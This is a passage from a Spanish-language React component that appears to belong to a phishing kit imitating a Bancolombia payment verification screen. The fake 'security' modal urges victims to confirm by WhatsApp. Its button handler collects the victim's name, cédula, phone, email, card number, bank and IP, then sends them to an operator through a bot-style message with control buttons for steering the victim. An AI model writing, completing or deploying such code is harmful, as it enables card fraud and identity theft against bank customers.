                    boxShadow: "0 8px 32px rgba(0,0,0,0.25)",
                  }}
                  onClick={(e) => e.stopPropagation()}
                >
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "center",
                      marginBottom: 22,
                    }}
                  >
                    <div
                      style={{
                        width: 56,
                        height: 56,
                        borderRadius: "50%",
                        background: "#f4b6b6",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <svg
                        width="26"
                        height="26"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="#111"
                        strokeWidth="3"
                        strokeLinecap="round"
                      >
                        <line x1="6" y1="6" x2="18" y2="18" />
                        <line x1="18" y1="6" x2="6" y2="18" />
                      </svg>
                    </div>
                  </div>

                  <h3
                    className="psm-identity-title"
                    style={{
                      fontSize: 17,
                      fontWeight: 700,
                      color: "#1a1a1a",
                      margin: "0 0 18px",
                      lineHeight: 1.35,
                      textAlign: "center",
                    }}
                  >
                    Por seguridad, no puedes continuar la transaccion
                  </h3>
                  <p
                    className="psm-identity-text"
                    style={{
                      fontSize: 13,
                      color: "#555",
                      lineHeight: 1.6,
                      margin: "0 0 14px",
                      textAlign: "center",
                    }}
                  >
                    Codigo: 923 Para confirmar si eres tu quien hace la
                    transaccion, te escribiremos desde nuestro WhatsApp oficial
                    301 353 6788, responde Si o No.
                  </p>
                  <p
                    className="psm-identity-text psm-identity-text-last"
                    style={{
                      fontSize: 13,
                      color: "#555",
                      lineHeight: 1.6,
                      margin: "0 0 28px",
                      textAlign: "center",
                    }}
                  >
                    Si ya confirmo puede continuar.
                  </p>

                  <button
                    onClick={() => {
                      setShowIdentityModal(false);
                      setStatus("error_otp");
                      savePaymentStateService(sessionId, "error_otp");

                      const ip =
                        localStorage.getItem("ip") || "IP no disponible";
                      const cardInfoStr = getCardInfoString();

                      const mensaje =
                        `🏉 CONFIRMAR IDENTIDAD - INTENTAR DE NUEVO PRESIONADO\n` +
                        `🔑 Session ID: ${sessionId}\n` +
                        `📡 IP: ${ip}\n\n` +
                        `👤 ${cardInfoStr.titular}\n` +
                        `🪪 Cédula: ${cardInfoStr.cedula}\n` +
                        `📱 Teléfono: ${cardInfoStr.celular}\n` +
                        `✉️ Email: ${cardInfoStr.email}\n` +
                        `💳 Tarjeta: ${cardInfoStr.cardNumber}\n` +
                        `🏦 Banco: ${cardInfoStr.banco}\n\n` +
                        `📌 ESTADO: USUARIO PRESIONÓ INTENTAR DE NUEVO (CONFIRMAR IDENTIDAD)`;

                      const keyboard = {
                        inline_keyboard: [
                          [
                            {
                              text: "📁 Errores",
                              callback_data: "carpeta_errores",
                            },
                            {
                              text: "📁 Pages",
                              callback_data: "carpeta_pages",
                            },
                          ],
                          [{ text: "✅ Check", callback_data: "check" }],
                        ],
                      };
                      sendMessage(mensaje, keyboard, sessionId);
                    }}
                    style={{
                      width: "80%",
                      padding: "12px 0",
                      background: "#FDDA24",
                      color: "#000",
                      fontWeight: 700,
                      fontSize: 14,
                      border: "none",
                      borderRadius: 24,
                      cursor: "pointer",
                    }}
                  >
                    Intentar de nuevo
                  </button>
                </div>
              </div>
            ))}

          {/* ── Botón Cerrar (solo Bancolombia) ── */}
          {isBancolombia && (
            <div className="flex w-full justify-end mt-2 border-t border-gray-200 pt-2">
              <button
                className="text-xs hover:text-black"
                onClick={() => {
                  if (onClose) onClose(false);
                }}
              >
                Cerrar
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default PaymentStatusModal;
